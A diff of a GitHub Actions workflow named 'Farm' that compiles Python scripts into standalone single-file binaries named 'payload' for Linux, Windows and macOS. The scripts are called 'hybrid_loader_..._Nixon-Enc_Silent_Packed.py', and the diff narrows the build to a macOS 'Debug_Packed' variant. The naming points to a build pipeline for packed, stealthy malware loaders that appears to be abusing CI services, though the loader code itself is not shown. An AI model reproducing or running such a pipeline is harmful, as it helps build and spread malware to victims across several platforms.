@@ -3,16 +3,15 @@ name: Farm
 on: workflow_dispatch
 jobs:
   desktop-farm:
-    if: ${ '{os: ubuntu-22.04, target: linux, artifact: payload.linux.bin, cmd: "python -m pip install nuitka zstandard ordered-set requests websockets && python -m nuitka --standalone --onefile --remove-output --assume-yes-for-downloads --include-package=runpy --include-package=importlib --include-package=ctypes --include-package=encodings --include-package=asyncio --include-module=uuid,json,ssl,socket,base64,lzma,struct,hashlib,hmac,secrets,datetime,threading,multiprocessing,subprocess,platform,argparse,urllib.request,shutil,tempfile,random,warnings,contextlib,weakref,signal,bisect,email,http,requests,websockets,websockets.exceptions,websockets.legacy,websockets.legacy.client --output-filename=payload.linux.bin hybrid_loader_v0au1n88_Nixon-Enc_Silent_Packed.py"},
-          {os: windows-latest, target: windows, artifact: payload.windows.exe, cmd: "python -m pip install nuitka zstandard ordered-set requests websockets && python -m nuitka --standalone --onefile --output-filename=payload.windows.exe hybrid_loader_v0au1n88_Nixon-Enc_Silent_Packed.py"},
-          {os: macos-14, target: macos, artifact: payload.macos.bin, cmd: "pip3 install nuitka zstandard ordered-set requests websockets && python3 -m nuitka --standalone --onefile --output-filename=payload.macos.bin hybrid_loader_v0au1n88_Nixon-Enc_Silent_Packed.py"}' != '' }
     strategy:
       fail-fast: false
       matrix:
         include:
-          [{os: ubuntu-22.04, target: linux, artifact: payload.linux.bin, cmd: "python -m pip install nuitka zstandard ordered-set requests websockets && python -m nuitka --standalone --onefile --remove-output --assume-yes-for-downloads --include-package=runpy --include-package=importlib --include-package=ctypes --include-package=encodings --include-package=asyncio --include-module=uuid,json,ssl,socket,base64,lzma,struct,hashlib,hmac,secrets,datetime,threading,multiprocessing,subprocess,platform,argparse,urllib.request,shutil,tempfile,random,warnings,contextlib,weakref,signal,bisect,email,http,requests,websockets,websockets.exceptions,websockets.legacy,websockets.legacy.client --output-filename=payload.linux.bin hybrid_loader_v0au1n88_Nixon-Enc_Silent_Packed.py"},
-          {os: windows-latest, target: windows, artifact: payload.windows.exe, cmd: "python -m pip install nuitka zstandard ordered-set requests websockets && python -m nuitka --standalone --onefile --output-filename=payload.windows.exe hybrid_loader_v0au1n88_Nixon-Enc_Silent_Packed.py"},
-          {os: macos-14, target: macos, artifact: payload.macos.bin, cmd: "pip3 install nuitka zstandard ordered-set requests websockets && python3 -m nuitka --standalone --onefile --output-filename=payload.macos.bin hybrid_loader_v0au1n88_Nixon-Enc_Silent_Packed.py"}]
+          - os: macos-14
+            target: macos
+            artifact: payload.macos.bin
+            cmd: 'pip3 install nuitka zstandard ordered-set requests websockets && python3 -m nuitka --standalone --onefile --output-filename=payload.macos.bin hybrid_loader_l9xip67y_Nixon-Enc_Debug_Packed.py'
+
     runs-on: ${{ matrix.os }}
     steps:
       - uses: actions/checkout@v4
